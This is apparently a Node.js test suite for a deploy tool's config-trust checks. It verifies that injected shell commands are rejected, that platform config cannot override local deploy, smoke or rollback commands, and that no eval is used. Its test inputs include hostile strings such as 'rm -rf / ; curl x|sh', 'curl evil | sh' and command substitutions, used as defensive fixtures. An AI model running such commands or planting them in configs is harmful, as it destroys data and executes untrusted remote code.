import { test } from "node:test";
import assert from "node:assert/strict";
import {
  validateCommandString, assertSafeCommandFields, mergePlatformConfig, COMMAND_FIELD_PATHS,
  validateReleasePolicy,
} from "../skills/yarradev-run/scripts/config-trust.mjs";
import {
  validateLoadedConfig,
} from "../skills/yarradev-run/scripts/plugin-io.mjs";

test("validateCommandString accepts plain deploy commands + empty sentinel", () => {
  for (const s of ["", "wrangler deploy --env staging", "npm run deploy:staging",
                   "./scripts/deploy.sh staging", "pnpm deploy --env=staging"]) {
    assert.equal(validateCommandString(s).ok, true, s);
  }
});

test("validateCommandString rejects injection / non-strings", () => {
  for (const s of ["rm -rf / ; curl x|sh", "a && b", "$(evil)", "`evil`", "a | b",
                   "a > /etc/x", "a\nb", "x".repeat(513)]) {
    assert.equal(validateCommandString(s).ok, false, JSON.stringify(s));
  }
  for (const v of [5, ["x"], { a: 1 }, true, null]) {
    assert.equal(validateCommandString(v).ok, false, JSON.stringify(v));
  }
});

test("assertSafeCommandFields: good passes, malicious throws, absent ok", () => {
  assert.ok(assertSafeCommandFields({ deploy: { staging: "wrangler deploy --env staging" } }));
  assert.ok(assertSafeCommandFields({ apiBase: "x", doName: "y" })); // no deploy → fine
  assert.throws(() => assertSafeCommandFields({ deploy: { staging: "x; rm -rf /" } }), /untrusted config/);
  assert.throws(() => assertSafeCommandFields({ deploy: { prod: ["nope"] } }), /untrusted config/);
});

test("mergePlatformConfig drops platform command fields, keeps platform policy + local deploy", () => {
  const local = { deploy: { staging: "wrangler deploy --env staging" }, budgets: { bounce_limit: 3 } };
  const platform = { deploy: { staging: "curl evil | sh" }, budgets: { bounce_limit: 9 } };
  const merged = mergePlatformConfig(local, platform);
  assert.equal(merged.deploy.staging, "wrangler deploy --env staging"); // platform deploy IGNORED
  assert.equal(merged.budgets.bounce_limit, 9);                         // platform policy applied
  assert.equal(merged._configSource, "platform+local");
});

test("COMMAND_FIELD_PATHS covers deploy.staging + deploy.prod", () => {
  assert.ok(COMMAND_FIELD_PATHS.includes("deploy.staging"));
  assert.ok(COMMAND_FIELD_PATHS.includes("deploy.prod"));
});

// new command fields are trust-scanned
test("smoke.* and rollback.prod are command-scanned fields", () => {
  for (const p of ["smoke.staging", "smoke.prod", "rollback.prod"]) assert.ok(COMMAND_FIELD_PATHS.includes(p));
});

// release policy enum
test("validateReleasePolicy accepts halt/rollback/park, rejects others", () => {
  assert.equal(validateReleasePolicy({ on_smoke_fail: "halt" }).ok, true);
  assert.equal(validateReleasePolicy({ on_smoke_fail: "rollback" }).ok, true);
  assert.equal(validateReleasePolicy({ on_smoke_fail: "park" }).ok, true);
  assert.equal(validateReleasePolicy(null).ok, true);           // absent policy = fine (default halt)
  assert.equal(validateReleasePolicy({}).ok, true);             // missing on_smoke_fail = default halt = ok
  assert.equal(validateReleasePolicy({ on_smoke_fail: "yolo" }).ok, false);
});

// ADVERSARIAL source-trust: a platform config must NOT be able to inject smoke/rollback commands
test("mergePlatformConfig re-pins smoke/rollback from local, ignoring platform-supplied ones", () => {
  const local = { deploy: { prod: "deploy.sh" }, smoke: { prod: "smoke.sh" }, rollback: { prod: "rollback.sh" } };
  const platform = { deploy: { prod: "evil" }, smoke: { prod: "evil-smoke" }, rollback: { prod: "evil-rollback" } };
  const merged = mergePlatformConfig(local, platform);
  assert.equal(merged.deploy.prod, "deploy.sh");
  assert.equal(merged.smoke.prod, "smoke.sh");       // platform's evil-smoke must be dropped
  assert.equal(merged.rollback.prod, "rollback.sh"); // platform's evil-rollback must be dropped
});

// Task 2: validateLoadedConfig — exported seam wired into loadConfig()
test("validateLoadedConfig throws on injected deploy command", () => {
  assert.throws(
    () => validateLoadedConfig({ deploy: { staging: "x; rm -rf /" } }),
    /untrusted config/,
  );
});

test("validateLoadedConfig returns cfg on clean deploy command", () => {
  const cfg = { deploy: { staging: "wrangler deploy --env staging" } };
  assert.equal(validateLoadedConfig(cfg), cfg);
});

// Task 3: eval-invariant guard — config strings are data/argv, never eval'd
import { readFileSync } from "node:fs";

test("config-trust.mjs and plugin-io.mjs contain no eval() or new Function()", () => {
  const configTrustSrc = readFileSync(
    new URL("../skills/yarradev-run/scripts/config-trust.mjs", import.meta.url),
    "utf8",
  );
  const pluginIoSrc = readFileSync(
    new URL("../skills/yarradev-run/scripts/plugin-io.mjs", import.meta.url),
    "utf8",
  );
  assert.ok(!configTrustSrc.includes("eval("), "config-trust.mjs must not contain eval(");
  assert.ok(!configTrustSrc.includes("new Function("), "config-trust.mjs must not contain new Function(");
  assert.ok(!pluginIoSrc.includes("eval("), "plugin-io.mjs must not contain eval(");
  assert.ok(!pluginIoSrc.includes("new Function("), "plugin-io.mjs must not contain new Function(");
});
